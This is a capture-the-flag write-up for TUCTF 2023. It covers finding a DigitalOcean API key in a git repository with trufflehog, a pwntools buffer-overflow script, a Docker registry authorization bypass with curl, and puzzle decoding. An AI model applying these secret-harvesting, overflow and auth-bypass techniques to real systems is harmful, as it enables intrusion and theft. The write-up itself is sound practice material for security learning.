
# tuctf 2023
https://tuctf.com/2023

### Index
- [Forensics](#forensics)
    - [state of the git](#state-of-the-git)
- [Pwn](#pwn)
    - [hidden values](#hidden-values)
- [Misc](#misc)
    - [silly registry](#silly-registry)
    - [secret agent](#secret-agent)


# Forensics

## state of the git
Description: <br>
given is an git repository, with an IaC (Infrastructure as Code) codebase written in Terraform.

You can search the repository for api keys with tools like [trufflehog](https://github.com/trufflesecurity/trufflehog), which will give you an digitalocean v2 API key.
```bash
# run "trufflehog filesystem ." inside git repository
🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷

Found unverified result 🐷🔑❓
Detector Type: DigitalOceanV2
Decoder Type: BASE64
Raw result: dop_v1_07fbc880cf053a91979807dfaaf8ad5c9880abae1f8df2ccece966942af41408
File: .git/objects/95/5de908450115ce7b6892c2a58c03e7e2221a6f
Line: 60

# inspect the git object further
git cat-file -p 955de908450115ce7b6892c2a58c03e7e2221a6f 

# the flag is base64 encoded in following line:
"password": "VFVDVEZ7NzNycjRmMHJtX1M3QTczLTF5XzUzY3IzNzV9Cg==", // ZG9wX3YxXzA3ZmJjODgwY2YwNTNhOTE5Nzk4MDdkZmFhZjhhZDVjOTg4MGFiYWUxZjhkZjJjY2VjZTk2Njk0MmFmNDE0MDgK < Change this before going !
```

## free proxy
Description: <br>
Given are two ports i.e. Alice and Bob

You are an proxy between those two parties and must intercept their RSA encrypted traffic. <br>
Key exchange:
    - Bob pub -> proxy
    - proxy pub -> Alice
    - Alice pub -> proxy
    - proxy pub -> Bob

script to solve it -> [free_proxy.py](./free_proxy.py)

# Pwn

## hidden values
Description: <br>
Given is an tcp socket, to whom you can connect with netcat.

<img src="./hidden-value.png" width="200">

You need to overwrite an variable on the stack with 0xdeadbeef, through an buffer overflow to trigger the if statement and get the flag:
```python
from pwn import *

# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# connect
io = remote("chal.tuctf.com", 30011)

# Build the payload
payload = flat(
        b'A' * 44,
        p32(0xdeadbeef)
)

# Send the payload
io.sendlineafter(b':', payload)
io.recvall()

# bruteforce location of 0xdeadbeef locally:
#for i in range(0,100):
#    io = process('./hidden-value')
#    io.sendlineafter(b':', b'A' * i + p32(0xdeadbeef))
#    print(io.recvall().decode('latin-1'))
```


# Misc

## silly registry
Description: <br>
given is a hostname and port.

On the port runs https://distribution.github.io/distribution which is docker registry software to host docker container images. <br>
The registry uses silly authorization, which is for developing purposes and only check if the Authorization header is present and not the content.
- https://distribution.github.io/distribution/about/configuration/#silly
- https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry
- https://github.com/Syzik/DockerRegistryGrabber

```bash
# connect with Authorization header and retrieve image list
curl -H "Authorization: anything" http://chal.tuctf.com:30003/v2/_catalog

# use docker registry grabber to enumerate 
python drg.py -A "lkas" http://chal.tuctf.com:30003/v2/ --dump_all

# the flag is one of the extracted images
```


## secret agent
Description: <br>
given is a tcp socket to whom you can connect with netcat.

Key: <br>
First you need to find the correct key, which is "HAHAHAHAHHAHAHAHAHAHAH"

Challenge1: <br>
Script for mapping the cities with their costs and calculating the cheapest path is [agent.py](./agent.py). The correct path with a cost of 20 is ['Attaya', 'Charity', 'Emell', 'Iyona', 'Kepliker', 'Osiros', 'Rhenora', 'Shariot']. 

Challenge2: <br>
you get text in the braille alphabet " ⠥⠞⠀⠞⠉⠀⠎⠊⠋⠀⠍⠁⠀⠵⠁⠀⠝⠊⠀⠺⠊⠛⠀⠇⠇⠊⠀⠕⠉⠀⠍⠀⠑⠀⠃⠀⠅⠉⠁⠀⠛⠁⠀⠝⠊⠁". <br> 
When decoding it with https://www.dcode.fr/braille-alphabet you get "UT TC SIF MA ZA NI WIG LLI OC M E B KCA GA NIA". <br>
Which is little endian, so you need to read each chunck from back to front, which results to TUCTFISAMAZINGIWILLCOMEBACKAGAIN.

Challenge3: <br>
Enter TUCTFISAMAZINGIWILLCOMEBACKAGAIN, and get the flag